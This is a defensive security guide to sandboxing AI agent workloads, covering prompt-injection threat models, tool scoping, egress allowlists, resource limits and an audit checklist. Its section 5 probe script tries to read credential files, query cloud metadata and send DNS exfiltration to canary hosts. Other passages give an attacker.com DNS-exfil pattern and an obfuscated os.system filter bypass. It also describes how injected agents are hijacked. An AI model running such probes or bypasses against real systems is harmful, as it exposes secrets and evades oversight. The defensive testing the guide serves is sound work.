# 05 — Sandboxing AI & Agent Workloads

Scope: executing model-generated code, scoping agent tool permissions, egress
control, and resource limits for LLM-driven workloads. Builds on `01` (boundary
choice), `02`/`03` (mechanisms), `04` (subprocess hygiene).

---

## 1. Threat model: model output is attacker input

**R1.1 — Treat all model-generated code/commands as untrusted-code (class A in `01`).**
Not because the model is malicious, but because (a) prompt injection makes the model
a *confused deputy* executing attacker instructions embedded in any data it reads
(web pages, READMEs, issue comments, tool outputs, emails), and (b) even benign
models emit destructive mistakes (`rm -rf`, dropped tables, infinite loops).
"We prompt it to be safe" and "we regex the code for dangerous patterns" are not
controls — blocklist filtering of a Turing-complete language is formally hopeless
(`getattr(__import__('o'+'s'),'sys'+'tem')`, encodings, `pickle`, ctypes…).

**R1.2 — The lethal trifecta rule.** An agent that simultaneously has
(1) access to private data, (2) exposure to untrusted content, and (3) an
exfiltration channel (network egress, ability to write somewhere public) is
exploitable by prompt injection *by construction*. Design every agent to lack at
least one leg: e.g., codegen sandbox with private data but **no egress**; or a
web-browsing agent with egress but **no secrets/files**. Auditing an agent =
finding where all three legs coexist.

**R1.3 — Plan for compromise, not for prevention.** Injection defenses (prompt
hardening, classifiers, spotlighting) reduce frequency; the sandbox bounds impact.
Size the boundary as if injection success rate were 100% — not hypothetical:
prompt-injection escapes of IDE-agent terminal sandboxes are a demonstrated CVE
class (e.g. Cursor "DuneSlide", CVE-2026-50548/-50549, CVSS 9.8, fixed in 3.0);
the R2.1 boundary floor plus egress denial is what contains a hijacked agent.

For a shared audit taxonomy, map findings to the OWASP Top 10 for Agentic
Applications (2026): this file's controls address ASI01 goal hijack (R1.2),
ASI02 tool misuse (§3), ASI05 unexpected code execution (§2), and ASI06
memory/context poisoning (R2.3).

## 2. Executing model-generated code

**R2.1 — Boundary floor:** per `01` decision table — gVisor minimum;
Firecracker/Kata microVM preferred, **fresh per session, destroyed after**
(E2B/Modal/Cloudflare-style architecture). One sandbox per conversation/session;
never share across users; never persist attacker-reachable state between sessions
of different trust domains.

```bash
# Minimal local pattern: model code in a locked-down container
docker run --rm --runtime=runsc \
  --network none \
  --user 65532:65532 --read-only \
  --tmpfs /workspace:rw,nosuid,nodev,size=256m \
  --cap-drop=ALL --security-opt no-new-privileges \
  --security-opt seccomp=codegen-seccomp.json \
  --pids-limit 64 --memory 512m --memory-swap 512m --cpus 1 \
  python-sandbox:pinned@sha256:<digest> \
  timeout -k 5 30 python /workspace/snippet.py
```

**R2.2 — What the code sandbox must NOT contain:** API keys/env secrets (model code
will read `os.environ` — innocently or not), cloud metadata access, the agent's own
orchestration credentials (model code must not be able to call the LLM API or tool
broker with the agent's identity), host filesystem mounts beyond the job workspace,
SSH agent sockets, dotfiles (`~/.aws`, `~/.netrc`, `~/.git-credentials`,
`~/.ssh`), and write access to anything the *orchestrator later executes or trusts*
(no writing to the agent's config, hooks, `.bashrc`, CI files it will run —
sandbox-escape-by-persistence).

**R2.3 — Results crossing back are untrusted input.** Stdout/files from the sandbox
get size caps, schema validation, and injection-aware handling before re-entering
the model context (tool output is a prompt-injection vector) or your application
(no `eval` of returned "JSON", no rendering returned HTML unsandboxed).

**R2.4 — Package installation is egress + supply chain.** If the sandbox can
`pip install`, it has network and will execute arbitrary setup.py code. Options in
descending preference: pre-baked images with a vetted dependency set; an internal
proxy/mirror with allowlisted packages; per-install ephemeral network namespace that
can reach only the mirror. Never general internet for installs in the same sandbox
that holds private data (R1.2).

## 3. Tool permission scoping

**R3.1 — Tools are the agent's syscall layer; design them like a broker (`04` §2).**
The model gets narrow, parameter-validated verbs, not general capability:
`search_tickets(query)` not `run_sql(string)`; `send_team_message(channel∈allowlist,
text)` not `http_post(url, body)`. The tool *implementation* holds the credentials
and enforces policy server-side — never trust model-supplied arguments to define
scope (path traversal, URL substitution, SQL in "filters").

**R3.2 — Per-agent, per-task least privilege:** each agent gets its own identity
(service account / token) scoped to the task's resources, short-lived (minutes/hours),
read-only by default. A "repo triage" agent gets read on one repo, not an org PAT.
Audit question: "if this agent's session were fully hijacked, what exactly can the
token do, for how long, and where is that logged?"

**R3.3 — Human-in-the-loop on irreversible/expansive actions:** deletes, payments,
sending external email, pushing to default branches, modifying permissions, spending
above a threshold. Approval UX must show the *actual* action (full command, full
recipient list, diff), not the model's summary of it — the summary is also
model-generated. Batch-approval fatigue is real: keep the privileged-action set
small enough that prompts stay rare and meaningful.

**R3.4 — Filesystem scoping for coding agents:** workspace-root jail enforced by the
harness (not by prompt), `RESOLVE_BENEATH`-style canonicalization on every path
argument, deny-list for sensitive files even inside the workspace (`.env`,
`*.pem`, `.git/config` hooks paths), and **no write access to agent-config files
the harness itself reads** (settings, hook definitions, MCP configs) without
approval — that's privilege escalation; repo-carried agent config (hooks,
settings, MCP definitions) executing on project open is an in-the-wild 2026
attack pattern — treat checked-in agent config as untrusted code. Watch MCP
servers: each one you attach is a new tool surface with its own (often
excessive) credentials; review them like third-party code with prod access, pin
versions, prefer servers that accept scoped tokens, and require the MCP spec's
OAuth authorization on any remote server — unauthenticated internet-exposed MCP
servers are a recurring 2026 incident class (NSA published a dedicated CSI on
MCP security, May 2026). Pin the tool *definitions* too (hash + re-approve on
any change) — tool poisoning, rug pulls, shadowing, and line jumping all ride
on unreviewed tool metadata (named taxonomy: sota-code-security rules/08 §5).

## 4. Egress allowlists and resource limits

**R4.1 — Default-deny network egress; allowlist by FQDN, not by "no policy".**
The exfiltration leg of the trifecta dies here. Implementation tiers:
- Best: no network namespace connectivity at all (codegen rarely needs it).
- Good: egress only via an authenticating forward proxy (mitmproxy/Envoy/Smokescreen)
  that enforces an FQDN allowlist + method/path rules and logs every request;
  sandbox has routes only to the proxy. Block direct IP literals, redirects
  re-checked, CONNECT restricted to allowlisted hosts on 443.
- K8s: Cilium `toFQDNs` / NetworkPolicy per `03` R3.4.
Always block: cloud metadata (169.254.169.254, fd00:ec2::254), RFC1918/link-local
(SSRF into internal services), DNS to non-approved resolvers (DNS tunneling), and
remember webhooks/paste sites/`raw.githubusercontent.com` are exfil channels too —
allowlist destinations, don't blocklist "bad sites".

Concrete shape (Envoy-style; Smokescreen and mitmproxy scripts express the same):

```yaml
# egress proxy ACL for a coding-agent sandbox
allow:
  - host: pypi.org            ports: [443]   methods: [GET]
  - host: files.pythonhosted.org  ports: [443]  methods: [GET]
  - host: registry.npmjs.org  ports: [443]   methods: [GET]
  - host: github.com          ports: [443]   methods: [GET]   # clone only; no push
deny_categories:
  - ip_literals: true          # block https://1.2.3.4/
  - private_ranges: true       # RFC1918, 169.254/16, fd00::/8
  - non_connect_ports: true
on_deny: log + return 403     # and alert past threshold (R4.4)
```
The sandbox's only route is to this proxy; `HTTPS_PROXY` env is convenience, the
*route table/netns* is the control (model code can unset env vars).

**R4.2 — DNS is an exfil channel by itself** (`<base32-of-secret>.attacker.com`).
Resolve through a controlled resolver that only answers for allowlisted domains,
or do proxy-side resolution with the sandbox having no DNS at all.

**R4.3 — Resource limits, all four axes, every execution:**
- **Wall-clock:** hard timeout with process-group kill (`timeout -k`, supervisor
  kill of the microVM). CPU quota alone never terminates (`02` R7.2).
- **CPU/memory:** cgroup `cpu.max`, `memory.max`+`swap.max=0`, `oom.group=1`.
- **Output:** cap stdout/stderr/file sizes (truncate + flag); model loops that
  print gigabytes are common and also poison the next prompt's token budget.
- **Spend/iteration:** cap tool calls, tokens, sub-agent depth/fan-out, and
  per-session monetary spend; an injected agent's first move is often "do this in a
  loop". Kill-switch that revokes the agent's token mid-session must exist.

**R4.4 — Log every action attribution-grade:** tool name, full arguments, decision
(allowed/denied/approved-by), sandbox ID, session/user, result hash — to an
append-only store *outside* the sandbox. Prompt-injection incidents are debugged
from these logs; without them you can't even tell what leaked. Alert on: denied
egress spikes, metadata-endpoint attempts, reads of credential-shaped paths,
approval-bypass attempts.

## 5. Verification probe for agent sandboxes

**R5.0 — Run this (or equivalent) *as the agent would*, in CI and after any
infra change** (per `01` §5). Every line must fail:

```bash
#!/bin/sh -e  # each command must NOT succeed; invert and assert
cat /run/secrets/* ~/.aws/credentials ~/.ssh/id_* 2>/dev/null && exit 1
env | grep -Ei 'key|token|secret|password' | grep -v '^SANDBOX_' && exit 1
curl -m3 -sf http://169.254.169.254/latest/meta-data/ && exit 1
curl -m3 -sf https://attacker-canary.example.com/ && exit 1
curl -m3 -sf https://93.184.216.34/ && exit 1          # raw IP egress
nslookup exfil-$(head -c8 /dev/urandom|xxd -p).canary.example.com \
  8.8.8.8 2>/dev/null && exit 1                         # rogue-resolver DNS
touch /etc/probe /probe "$AGENT_CONFIG_DIR/probe" 2>/dev/null && exit 1
unshare -rn true 2>/dev/null && exit 1                  # namespace creation
echo "all denials held"
```
Pair with a *positive* probe (allowed mirror reachable, workspace writable) so a
broken-but-fail-closed sandbox is distinguishable from a working one.

## 6. Multi-agent and computer-use specifics

**R6.1 — Sub-agents inherit at most the parent's scope, ideally less.** A planner
spawning executors must not mint broader tokens; scope shrinks down the tree.
Cross-agent messages are untrusted content to the receiver (injection hops
between agents).

**R6.2 — Browser/computer-use agents:** the rendered page is untrusted input
*and* the screen-reading model executes on it — run the browser in its own
sandbox (dedicated container/VM per `03`), separate browser profile with zero
saved credentials, no access to the user's real cookie jar, allowlisted
navigable domains for high-privilege tasks, and treat downloads as class-B
untrusted input (`04` §1).

**R6.3 — Don't run the orchestrator inside the sandbox it controls.** The harness/
broker holding tokens and approval logic lives outside the boundary; only the
model-driven execution goes inside. If they share a process or filesystem, the
sandbox is decorative.

---

## Audit checklist

- [ ] All model-generated code executes in ≥ gVisor-grade sandbox (microVM
      preferred), ephemeral per session, never shared across users/trust domains.
- [ ] Lethal-trifecta map exists per agent: private-data access, untrusted-content
      exposure, egress — at least one leg removed or gated by approval; any agent
      with all three flagged Critical.
- [ ] Sandbox interior contains zero secrets: no env keys, no orchestrator/LLM
      credentials, no `~/.aws`/`.ssh`/dotfiles, metadata endpoint blocked; verified
      by running a secret-hunting probe inside, not by reading the spec.
- [ ] Sandbox cannot write to anything the orchestrator later executes or trusts
      (agent config, hooks, CI definitions) without human approval.
- [ ] Network: default-deny egress; FQDN allowlist via proxy or CNI; metadata +
      RFC1918 + raw-IP + unapproved-DNS blocked; proxy logs retained.
- [ ] Tools are narrow validated verbs with server-side authz; no generic
      exec/HTTP/SQL tool reachable without sandbox + approval; tool args
      canonicalized (paths beneath workspace, URLs against allowlist).
- [ ] Per-agent short-lived least-privilege identities; revocation kill-switch
      tested; sub-agent scope monotonically shrinks.
- [ ] Human approval on irreversible/external/spend actions, showing the raw
      action, not a model summary.
- [ ] Limits enforced on every run: wall-clock kill, memory/CPU/pids, output size,
      tool-call/token/spend caps.
- [ ] Tool/sandbox outputs treated as untrusted on re-entry (size caps, schema
      validation, injection-aware prompting); browser agents use credential-free
      profiles in their own sandbox.
- [ ] Append-only action log outside the sandbox with denied-action alerting;
      MCP/third-party tool servers inventoried, pinned, and scope-reviewed.
